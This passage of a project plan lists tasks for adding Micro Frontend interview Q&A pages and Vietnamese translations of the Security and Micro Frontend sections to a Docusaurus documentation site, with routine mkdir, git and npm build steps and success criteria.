git add docs/MicroFrontend/introduction.md
git commit -m "feat(microfrontend): add Micro Frontend introduction"
```

---

## Task 11-16: Micro Frontend Content Files

Create the following files with 4-5 Q&A each:

- **Task 11:** `architecture-patterns.md` - Build-time vs runtime integration, iframe, web components
- **Task 12:** `module-federation.md` - Webpack Module Federation, shared dependencies
- **Task 13:** `routing-navigation.md` - Routing strategies, navigation between MFEs
- **Task 14:** `state-management.md` - Shared state, communication patterns
- **Task 15:** `deployment-strategies.md` - Independent deployment, versioning
- **Task 16:** `communication-patterns.md` - Custom events, pub/sub, messaging

Each task follows the same pattern:
1. Create file with Q&A content
2. Test build
3. Commit

---

## Task 17: Vietnamese Translation - Security Category

**Files:**
- Create: `i18n/vi/docusaurus-plugin-content-docs/current/Security/_category_.json`

**Step 1: Create directory structure**

```bash
mkdir -p i18n/vi/docusaurus-plugin-content-docs/current/Security
```

**Step 2: Create Vietnamese category file**

Create `i18n/vi/docusaurus-plugin-content-docs/current/Security/_category_.json`:

```json
{
  "label": "Bảo mật",
  "link": {
    "description": "Nắm vững các câu hỏi phỏng vấn về bảo mật frontend bao gồm xác thực JWT, bảo vệ XSS/CSRF, xử lý dữ liệu an toàn, HTTPS/CORS, và các phương pháp bảo mật tốt nhất."
  }
}
```

**Step 3: Verify**

Run: `ls -la i18n/vi/docusaurus-plugin-content-docs/current/Security/`

**Step 4: Commit**

```bash
git add i18n/vi/docusaurus-plugin-content-docs/current/Security/
git commit -m "feat(i18n): add Vietnamese Security category"
```

---

## Task 18-24: Vietnamese Security Translations

Translate all 7 Security files to Vietnamese:

- **Task 18:** `introduction.md`
- **Task 19:** `authentication-jwt.md`
- **Task 20:** `xss-csrf-protection.md`
- **Task 21:** `secure-data-handling.md`
- **Task 22:** `https-cors.md`
- **Task 23:** `common-vulnerabilities.md`
- **Task 24:** `security-best-practices.md`

Each file:
1. Translate all questions and answers to Vietnamese
2. Keep code examples in English with Vietnamese comments
3. Technical terms: Vietnamese with English in parentheses
4. Test build after each file
5. Commit

---

## Task 25: Vietnamese Translation - Micro Frontend Category

**Files:**
- Create: `i18n/vi/docusaurus-plugin-content-docs/current/MicroFrontend/_category_.json`

**Step 1: Create directory**

```bash
mkdir -p i18n/vi/docusaurus-plugin-content-docs/current/MicroFrontend
```

**Step 2: Create category file**

```json
{
  "label": "Micro Frontend",
  "link": {
    "description": "Nắm vững các mẫu kiến trúc micro frontend, module federation, chiến lược routing, quản lý state, và cách triển khai cho ứng dụng web có khả năng mở rộng."
  }
}
```

**Step 3: Commit**

```bash
git add i18n/vi/docusaurus-plugin-content-docs/current/MicroFrontend/
git commit -m "feat(i18n): add Vietnamese Micro Frontend category"
```

---

## Task 26-32: Vietnamese Micro Frontend Translations

Translate all 7 Micro Frontend files to Vietnamese:

- **Task 26:** `introduction.md`
- **Task 27:** `architecture-patterns.md`
- **Task 28:** `module-federation.md`
- **Task 29:** `routing-navigation.md`
- **Task 30:** `state-management.md`
- **Task 31:** `deployment-strategies.md`
- **Task 32:** `communication-patterns.md`

Same translation pattern as Security files.

---

## Task 33: Final Testing & Verification

**Step 1: Run full build**

```bash
npm run build
```

Expected: Build succeeds for both en and vi locales

**Step 2: Test local server**

```bash
npm run serve
```

Expected: Server starts, can navigate to Security and Micro Frontend sections in both languages

**Step 3: Verify all content**

Manual checks:
- [ ] All 7 Security files display correctly (English)
- [ ] All 7 Micro Frontend files display correctly (English)
- [ ] All Vietnamese translations display correctly
- [ ] Code syntax highlighting works
- [ ] Mermaid diagrams render
- [ ] Navigation works between files
- [ ] Search includes new content

**Step 4: Final commit**

```bash
git add .
git commit -m "test: verify all Security and Micro Frontend content"
```

---

## Task 34: Documentation Update

**Files:**
- Update: `docs/intro.md`

**Step 1: Add new topics to introduction**

Add Security and Micro Frontend to the intro page listing available topics.

**Step 2: Commit**

```bash
git add docs/intro.md
git commit -m "docs: update intro with Security and Micro Frontend topics"
```

---

## Success Criteria

- [ ] Security topic with 7 files (25-30 Q&A total)
- [ ] Micro Frontend topic with 7 files (25-30 Q&A total)
- [ ] Full Vietnamese translations for both topics
- [ ] All code examples syntax-highlighted
- [ ] Mermaid diagrams render correctly
- [ ] Build succeeds without errors
- [ ] Both topics appear in sidebar
- [ ] Search functionality works
- [ ] All commits follow conventional commit format
- [ ] No broken links or images

---

## Estimated Time

- Security content (English): ~2-3 hours
- Micro Frontend content (English): ~2-3 hours
- Vietnamese translations: ~2-3 hours
- Testing and refinement: ~1 hour
- **Total: ~8-10 hours**

---

## Notes

- Follow DRY: Reuse Q&A structure template
- Follow YAGNI: Only essential content, no over-engineering
- Commit frequently after each file
- Test build after every 2-3 files to catch issues early
- Use Mermaid for diagrams instead of images where possible
- Keep code examples production-ready and well-commented
- Ensure all external links are valid and up-to-date
